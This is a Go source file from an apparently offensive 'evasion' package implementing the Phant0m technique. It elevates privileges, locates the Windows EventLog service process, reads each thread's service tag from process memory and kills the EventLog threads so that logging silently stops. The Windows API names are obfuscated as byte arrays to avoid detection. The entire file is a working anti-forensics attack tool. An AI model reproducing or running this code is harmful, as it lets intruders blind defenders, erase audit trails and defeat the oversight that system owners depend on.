package evasion

import (
	"errors"
	"unsafe"

	"golang.org/x/sys/windows"
)

func GetEventLogPid() (int, error) {
  advapi32 := windows.NewLazyDLL("advapi32.dll")

  OpenSCManager := advapi32.NewProc("OpenSCManagerW")
  OpenService := advapi32.NewProc("OpenServiceW")
  QueryServiceStatusEx := advapi32.NewProc("QueryServiceStatusEx")

	var ssp windows.SERVICE_STATUS_PROCESS
	var dwBytesNeeded uint32

	scm, _, err := OpenSCManager.Call(0, 0, windows.SERVICE_QUERY_STATUS)
	if scm == 0 {
		return 0, err
	}

	svc, _, err := OpenService.Call(scm, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("EventLog"))), windows.SERVICE_QUERY_STATUS)
	if svc == 0 {
		return 0, err
	}

  QueryServiceStatusEx.Call(svc, windows.SC_STATUS_PROCESS_INFO, uintptr(unsafe.Pointer(&ssp)), uintptr(unsafe.Sizeof(ssp)), uintptr(unsafe.Pointer(&dwBytesNeeded)))

	return int(ssp.ProcessId), nil
}

// Main function
func Phant0m(eventlog_pid int) error {
	err := ElevateProcessToken() // admin privs needed
	if err != nil {
		return err
	}

	ntdll := windows.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	NtQueryInformationThread := ntdll.NewProc(string([]byte{'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'T', 'h', 'r', 'e', 'a', 'd'}))

	advapi32 := windows.NewLazyDLL(string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}))
	I_QueryTagInformation := advapi32.NewProc(string([]byte{'I', '_', 'Q', 'u', 'e', 'r', 'y', 'T', 'a', 'g', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n'}))

	kernel32 := windows.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	OpenThread := kernel32.NewProc(string([]byte{'O', 'p', 'e', 'n', 'T', 'h', 'r', 'e', 'a', 'd'}))
	OpenProcess := kernel32.NewProc(string([]byte{'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's'}))
	TerminateThread := kernel32.NewProc(string([]byte{'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd'}))
	CloseHandle := kernel32.NewProc(string([]byte{'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e'}))
	ReadProcessMemory := kernel32.NewProc(string([]byte{'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y'}))
	CreateToolhelp32Snapshot := kernel32.NewProc(string([]byte{'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't'}))
	Thread32First := kernel32.NewProc(string([]byte{'T', 'h', 'r', 'e', 'a', 'd', '3', '2', 'F', 'i', 'r', 's', 't'}))
  Thread32Next := kernel32.NewProc(string([]byte{'T', 'h', 'r', 'e', 'a', 'd', '3', '2', 'N', 'e', 'x', 't'}))

	var hThreads uintptr
	hThreads, _, _ = CreateToolhelp32Snapshot.Call(
		windows.TH32CS_SNAPTHREAD,
		0,
	)

	if hThreads == 0 {
		return errors.New("An error has occurred calling CreateToolhelp32Snapshot")
	}

	tbi := PTHREAD_BASIC_INFORMATION{}
	te32 := windows.ThreadEntry32{}
	te32.Size = uint32(unsafe.Sizeof(te32))

	Thread32First.Call(
		hThreads,
		uintptr(unsafe.Pointer(&te32)),
	)

	for true {
		if te32.OwnerProcessID == uint32(eventlog_pid) {
			hEvtThread, _, _ := OpenThread.Call(
				windows.THREAD_QUERY_LIMITED_INFORMATION|windows.THREAD_SUSPEND_RESUME|windows.THREAD_TERMINATE,
				uintptr(0),
				uintptr(te32.ThreadID),
			)

			if hEvtThread == 0 {
				return errors.New("An error has occurred calling OpenThread")
			}

			NtQueryInformationThread.Call(
				uintptr(hEvtThread),
				0,
				uintptr(unsafe.Pointer(&tbi)),
				0x30,
				0,
			)

			hEvtProcess, _, _ := OpenProcess.Call(
				windows.PROCESS_VM_READ,
				uintptr(0),
				uintptr(te32.OwnerProcessID),
			)

			if hEvtProcess == 0 {
				return errors.New("An error has occurred calling OpenProcess")
			}

			if tbi.pTebBaseAddress != 0 {
				scTagQuery := SC_SERVICE_TAG_QUERY{}

				var hTag byte
				var pN uintptr
				ReadProcessMemory.Call(
					hEvtProcess,
					tbi.pTebBaseAddress+0x1720,
					uintptr(unsafe.Pointer(&hTag)),
					unsafe.Sizeof(pN),
					0,
				)

				scTagQuery.processId = te32.OwnerProcessID
				scTagQuery.serviceTag = uint32(hTag)

				I_QueryTagInformation.Call(
					0,
					1, // ServiceNameFromTagInformation
					uintptr(unsafe.Pointer(&scTagQuery)),
				)

				if scTagQuery.pBuffer != nil {
          TerminateThread.Call(
						uintptr(hEvtThread),
						0,
					)
				}

				CloseHandle.Call(hEvtThread)
				CloseHandle.Call(hEvtProcess)
			}
		}

		_, _, err := Thread32Next.Call(
			hThreads,
			uintptr(unsafe.Pointer(&te32)),
		)

		if err != nil {
			break
		}
	}

	CloseHandle.Call(hThreads)

	return nil
}
